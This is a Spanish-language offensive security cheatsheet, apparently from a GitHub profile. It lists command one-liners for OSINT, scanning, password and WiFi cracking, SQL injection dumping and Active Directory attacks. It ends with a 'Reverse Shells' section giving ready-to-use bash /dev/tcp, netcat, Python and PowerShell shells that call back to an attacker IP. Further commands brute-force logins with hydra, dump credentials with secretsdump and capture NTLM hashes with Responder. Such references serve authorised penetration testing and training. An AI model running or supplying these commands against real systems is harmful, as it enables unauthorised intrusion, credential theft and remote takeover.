<div align="center">

# 📜 Cheatsheets — El Pergamino del Ninja

*Recuerda todo, sin abrir 5 manuales.* Rápido, directo, esencial. ⚡

</div>

---

## 🌐 Networking y DNS

```bash
ip a                                  # interfaces y IPs
ip route                              # tabla de rutas
ping -c 4 8.8.8.8                    # conectividad
whois example.com                     # WHOIS
dig example.com ANY                   # todo DNS
dig TXT example.com                   # registros TXT
nslookup -type=A example.com          # resolución
host -t CNAME example.com             # CNAME
netstat -tulpn                       # puertos en escucha
ss -tulpn                            # igual (moderno)
```

## 🕵️ OSINT

```bash
theHarvester -d example.com -b all -l 500
sherlock <usuario>
maigret <usuario> --html reporte.html
sublist3r -d example.com -o subs.txt
amass enum -passive -d example.com -o subs.txt
exiftool -gps* foto.jpg               # GPS de una foto
exiftool -all= foto.jpg               # limpiar metadatos
holehe correo@example.com
whatweb -a 3 example.com
shodan search "apache country:MX"
shodan host 1.2.3.4
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sort -u
```

## 🛡️ OpSec

```bash
sudo systemctl start tor              # arrancar Tor (SOCKS5 :9050)
curl --socks5-hostname 127.0.0.1:9050 ifconfig.me
proxychains4 nmap -sT -Pn 10.10.10.5  # nmap vía proxy
sudo nipe.pl start                    # anonimato global (Nipe)
sudo anonsurf start                   # anonimato global (Anonsurf)
sudo macchanger -r wlan0              # MAC aleatoria
veracrypt -t --mount caja.hc /mnt/caja   # montar contenedor cifrado
gpg -e -r clave@persona.com archivo.txt  # cifrar
gpg -d archivo.txt.gpg > archivo.txt     # descifrar
mat2 -c foto.jpg                      # limpiar metadatos
srm -v archivo_secreto.txt            # borrado seguro
sudo fail2ban-client status sshd      # IPs baneadas
```

## ⚔️ Reconocimiento y Escaneo

```bash
nmap -sV -sC -O IP                    # completo
nmap -p- IP                           # todos los puertos
nmap -sn 192.168.1.0/24              # hosts vivos
nmap -sV -p 80,443 --script=vuln URL # vulnerabilidades
masscan -p1-65535 IP --rate=1000     # escaneo masivo
gobuster dir -u http://sitio -w wordlist -x php,txt
nikto -h http://sitio
whatweb -a 3 http://sitio
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://sitio/FUZZ
```

## 🔓 Contraseñas y Hashes

```bash
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt    # NTLM
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?d?d'    # máscara MD5
hydra -l admin -P rockyou.txt ssh://IP
hydra -l admin -P pass.txt ftp://IP
hydra -L user.txt -P pass.txt smb://IP
hashid '<hash>'                              # identificar formato
zip2john secreto.zip > z.hash && john z.hash
```

## 🌐 Web Exploitation

```bash
sqlmap -u "http://sitio/item.php?id=1" --dbs
sqlmap -u "http://sitio/item.php?id=1" -D bd -T tabla --dump
wpscan --url http://sitio --enumerate u
wpscan --url http://sitio --passwords rockyou.txt --usernames admin
dirsearch -u http://sitio -e php,txt
nc -lvnp 4444                              # receptor de shells
```

## 📡 Redes WiFi

```bash
sudo airmon-ng start wlan0                 # → wlan0mon
sudo airodump-ng wlan0mon                  # ver redes
sudo airodump-ng -c <canal> --bssid <MAC> -w cap wlan0mon
sudo aireplay-ng -0 5 -a <MAC_AP> wlan0mon
sudo aircrack-ng -w rockyou.txt cap-01.cap
```

## 🪟 Windows / Active Directory

```bash
evil-winrm -i IP -u admin -p 'pass'
evil-winrm -i IP -u admin -H <hash_ntlm>
responder -I eth0                          # capturar hashes NetNTLMv2
hashcat -m 5600 ntlmv2.txt rockyou.txt    # crackear NetNTLMv2
bloodhound-python -u u -p p -d dominio.local -ns IP -c All
GetNPUsers.py dominio/user -no-pass        # (impacket) AS-REP roast
secretsdump.py dominio/admin@IP            # volcar SAM/NTDS
psexec.py dominio/admin@IP                # shell por SMB
```

## 🐚 Reverse Shells (one-liners)

```bash
# Linux (bash)
bash -i >& /dev/tcp/IP/4444 0>&1

# Netcat
nc -e /bin/sh IP 4444

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

## 🗂️ Wordlists útiles en Kali

```bash
/usr/share/wordlists/rockyou.txt.gz     # gzip -d primero
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/                    # (instalar: apt install seclists)
/usr/share/metasploit-framework/data/wordlists/
```

---

<div align="center">

**«La repetición es la madre de la maestría.»** 🐉

[🏠 Índice de documentos](README.md) · [⬅ Volver al perfil](../README.md)

</div>